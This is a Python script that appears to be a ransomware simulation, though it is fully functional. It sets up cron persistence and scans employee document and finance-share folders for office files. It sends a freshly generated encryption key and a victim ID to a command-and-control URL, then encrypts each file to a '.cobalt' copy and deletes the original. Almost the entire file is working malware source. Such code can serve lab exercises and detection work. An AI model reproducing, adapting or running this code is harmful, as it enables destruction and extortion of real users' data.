import os
import uuid
import requests
import time
import socket
from cryptography.fernet import Fernet
import logging
import subprocess

# Setup logging (simulating "Found Folder" output or just hidden logs)
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger()

C2_URL = "http://c2-server:80/api/register_key"
TARGET_EXTS = ['.txt', '.csv', '.pdf', '.doc', '.docx']
TARGET_DIRS = ['/home/employee/Documents', '/mnt/finance_share']

def persistence():
    """Sets up a cron job for persistence."""
    try:
        current_script = os.path.abspath(__file__)
        # Simple persistence: run every minute (very aggressive for demo)
        job = f"* * * * * python3 {current_script} >> /tmp/malware.log 2>&1"
        
        # Check if already installed
        existing_crontab = subprocess.getoutput("crontab -l")
        if current_script not in existing_crontab:
            cmd = f'(crontab -l 2>/dev/null; echo "{job}") | crontab -'
            os.system(cmd)
            logger.info("Persistence established via cron.")
    except Exception as e:
        logger.error(f"Persistence failed: {e}")

def discover_files():
    """Finds target files."""
    files_to_encrypt = []
    for d in TARGET_DIRS:
        if os.path.exists(d):
            logger.info(f"Found Folder: {d}")
            for root, _, files in os.walk(d):
                for file in files:
                    if any(file.endswith(ext) for ext in TARGET_EXTS):
                        files_to_encrypt.append(os.path.join(root, file))
    return files_to_encrypt

def get_key(victim_id):
    """Generates a key and sends it to C2."""
    key = Fernet.generate_key()
    try:
        payload = {"victim_id": victim_id, "key": key.decode()}
        requests.post(C2_URL, json=payload, timeout=5)
        logger.info("Key sent to C2 server.")
        return key
    except Exception as e:
        logger.error(f"Failed to contact C2: {e}")
        # For simulation, we proceed with local key if C2 fails? 
        # No, typically ransomware waits or uses embedded key. 
        # We will use the generated key anyway for the demo.
        return key

def encrypt_file(file_path, cipher):
    """Encrypts a single file."""
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        encrypted_data = cipher.encrypt(data)
        
        with open(file_path + ".cobalt", 'wb') as f:
            f.write(encrypted_data)
        
        os.remove(file_path)
        logger.info(f"Encrypted: {file_path}")
    except Exception as e:
        logger.error(f"Failed to encrypt {file_path}: {e}")

def main():
    victim_id = str(uuid.getnode())
    logger.info(f"Malware started. Victim ID: {victim_id}")
    
    persistence()
    
    files = discover_files()
    if not files:
        logger.info("No files found to encrypt.")
        return

    key = get_key(victim_id)
    cipher = Fernet(key)
    
    for file_path in files:
        encrypt_file(file_path, cipher)
        
    logger.info("Encryption complete. Files Encrypted.")

if __name__ == "__main__":
    main()
